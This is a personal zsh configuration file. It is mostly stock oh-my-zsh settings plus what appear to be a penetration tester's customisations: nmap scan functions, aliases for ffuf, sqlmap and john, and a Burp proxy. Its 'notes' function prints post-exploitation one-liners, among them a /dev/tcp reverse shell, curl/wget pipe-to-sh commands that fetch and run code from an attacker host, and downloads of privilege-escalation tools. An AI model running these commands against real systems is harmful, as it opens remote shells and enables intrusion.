# If you come from bash you might have to change your $PATH.
# export PATH=$HOME/bin:/usr/local/bin:$PATH

# Path to your oh-my-zsh installation.
export ZSH="$HOME/.oh-my-zsh"

# Set name of the theme to load --- if set to "random", it will
# load a random theme each time oh-my-zsh is loaded, in which case,
# to know which specific one was loaded, run: echo $RANDOM_THEME
# See https://github.com/ohmyzsh/ohmyzsh/wiki/Themes
ZSH_THEME="robbyrussell"

# Set list of themes to pick from when loading at random
# Setting this variable when ZSH_THEME=random will cause zsh to load
# a theme from this variable instead of looking in $ZSH/themes/
# If set to an empty array, this variable will have no effect.
# ZSH_THEME_RANDOM_CANDIDATES=( "robbyrussell" "agnoster" )

# Uncomment the following line to use case-sensitive completion.
# CASE_SENSITIVE="true"

# Uncomment the following line to use hyphen-insensitive completion.
# Case-sensitive completion must be off. _ and - will be interchangeable.
# HYPHEN_INSENSITIVE="true"

# Uncomment one of the following lines to change the auto-update behavior
# zstyle ':omz:update' mode disabled  # disable automatic updates
# zstyle ':omz:update' mode auto      # update automatically without asking
# zstyle ':omz:update' mode reminder  # just remind me to update when it's time

# Uncomment the following line to change how often to auto-update (in days).
# zstyle ':omz:update' frequency 13

# Uncomment the following line if pasting URLs and other text is messed up.
# DISABLE_MAGIC_FUNCTIONS="true"

# Uncomment the following line to disable colors in ls.
# DISABLE_LS_COLORS="true"

# Uncomment the following line to disable auto-setting terminal title.
# DISABLE_AUTO_TITLE="true"

# Uncomment the following line to enable command auto-correction.
# ENABLE_CORRECTION="true"

# Uncomment the following line to display red dots whilst waiting for completion.
# You can also set it to another string to have that shown instead of the default red dots.
# e.g. COMPLETION_WAITING_DOTS="%F{yellow}waiting...%f"
# Caution: this setting can cause issues with multiline prompts in zsh < 5.7.1 (see #5765)
# COMPLETION_WAITING_DOTS="true"

# Uncomment the following line if you want to disable marking untracked files
# under VCS as dirty. This makes repository status check for large repositories
# much, much faster.
# DISABLE_UNTRACKED_FILES_DIRTY="true"

# Uncomment the following line if you want to change the command execution time
# stamp shown in the history command output.
# You can set one of the optional three formats:
# "mm/dd/yyyy"|"dd.mm.yyyy"|"yyyy-mm-dd"
# or set a custom format using the strftime function format specifications,
# see 'man strftime' for details.
# HIST_STAMPS="mm/dd/yyyy"

# Would you like to use another custom folder than $ZSH/custom?
# ZSH_CUSTOM=/path/to/new-custom-folder

# Which plugins would you like to load?
# Standard plugins can be found in $ZSH/plugins/
# Custom plugins may be added to $ZSH_CUSTOM/plugins/
# Example format: plugins=(rails git textmate ruby lighthouse)
# Add wisely, as too many plugins slow down shell startup.
plugins=(git zsh-syntax-highlighting zsh-fzf-history-search)

source $ZSH/oh-my-zsh.sh

# User configuration

# export MANPATH="/usr/local/man:$MANPATH"

# You may need to manually set your language environment
# export LANG=en_US.UTF-8

# Preferred editor for local and remote sessions
# if [[ -n $SSH_CONNECTION ]]; then
#   export EDITOR='vim'
# else
#   export EDITOR='mvim'
# fi

# Compilation flags
# export ARCHFLAGS="-arch x86_64"

# Set personal aliases, overriding those provided by oh-my-zsh libs,
# plugins, and themes. Aliases can be placed here, though oh-my-zsh
# users are encouraged to define aliases within the ZSH_CUSTOM folder.
# For a full list of active aliases, run `alias`.
#
# Example aliases
# alias zshconfig="mate ~/.zshrc"
# alias ohmyzsh="mate ~/.oh-my-zsh"
export PATH="$HOME/tools/john/run:$HOME/.local/bin:$HOME/go/bin:$PATH"
export JAVA_HOME="/usr/lib/jvm/java-17-openjdk-amd64"
export GEM_HOME="$HOME/gems/3.0.0"
export burp="http://127.0.0.1:8080"
setxkbmap latam

function mkt(){
    mkdir nmap tmp repos enum privesc
}

function scan(){
    target $1
    sudo nmap --min-rate 5000 -p-  --privileged -sS -Pn -n -v $1 -oN nmap/all-tcp-ports.txt
    ports=$(cat nmap/all-tcp-ports.txt | grep -oP "\d+/tcp" | cut -d / -f 1 | tr "\n"  "," |sed 's/,$//g')
    sudo nmap --reason --privileged -T4 -p$ports -A -Pn -n -v $1 -oN nmap/all-tcp-versions.txt


}
function target(){
    echo $1 > /tmp/target.txt
}
function ssh_() {
    ssh-keygen -f $1 -N ''
    xclip -r -selection clip $1.pub
}
function notes() {
    echo -e "python3 -c \"import pty;pty.spawn(['/bin/bash', '-li'])\""
    echo -e "script -q /dev/null -c /bin/bash"
    echo -e "export SHELL=/bin/bash TERM=xterm;stty rows 47 cols 247"
    echo -e "/bin/bash -c \"nohup /bin/bash -i &>/dev/tcp/$(</tmp/local.txt)/1337 0>&1 &\""
    echo -e "curl $(</tmp/local.txt):9001|sh"
    echo -e "wget $(</tmp/local.txt):9001|sh"
    echo -e "wget $(</tmp/local.txt):8000/{lse.sh,pspy64}"
    echo -e "curl $(</tmp/local.txt):8000/{lse.sh,pspy64} -O{lse.sh,pspy64}"
}

alias nc="ncat"
alias server="python3 -m http.server"
alias ffuf="ffuf -noninteractive -fmode and -mmode and -mc all -H \"User-Agent: Mozilla/5.0 (Linux; Android 5.1; iris 600 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36\" -c -v"
alias sqlmap="python3 ~/tools/sqlmap/sqlmap.py --random-agent"
alias feroxbuster="feroxbuster -A --no-state"
alias john="~/tools/john/run/john"
alias j="john --wordlist=/home/l1nvx/SecLists/Passwords/Leaked-Databases/rockyou.txt"
alias firefox="~/Escritorio/firefox/firefox-bin"

eval "$(starship init zsh)"
